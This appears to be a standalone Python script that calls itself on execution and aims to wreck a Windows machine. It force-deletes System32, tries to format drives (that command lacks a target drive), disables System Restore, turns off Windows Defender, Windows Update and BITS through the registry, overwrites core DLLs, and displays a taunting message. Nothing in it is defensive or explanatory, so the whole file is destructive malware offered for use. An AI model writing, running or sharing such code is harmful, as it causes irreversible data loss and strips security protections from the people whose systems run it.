import os

def destroy_windows():
    # WARNING: This code is extremely destructive and can cause irreversible damage to a Windows system.
    
    # Step 1: Delete critical system files
    os.system("del C:\\Windows\\System32\\*.* /f /s /q")
    
    # Step 2: Format all connected drives
    os.system("format /fs:NTFS /q /y")
    
    # Step 3: Disable system recovery
    os.system("wmic.exe /namespace:\\\\root\\default path SystemRestore call Disable")
    
    # Step 4: Modify the registry to disable important system services
    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend /v Start /t REG_DWORD /d 4 /f")
    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /v Start /t REG_DWORD /d 4 /f")
    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS /v Start /t REG_DWORD /d 4 /f")
    
    # Step 5: Corrupt system files
    with open("C:\\Windows\\System32\\ntdll.dll", "wb") as file:
        file.write(b"corrupted")
    
    with open("C:\\Windows\\System32\\kernel32.dll", "wb") as file:
        file.write(b"corrupted")
    
    with open("C:\\Windows\\System32\\user32.dll", "wb") as file:
        file.write(b"corrupted")
    
    # Step 6: Display a friendly message
    os.system("msg * Your Windows system has been destroyed. Good luck recovering!")
    
# Call the function to initiate destruction
destroy_windows()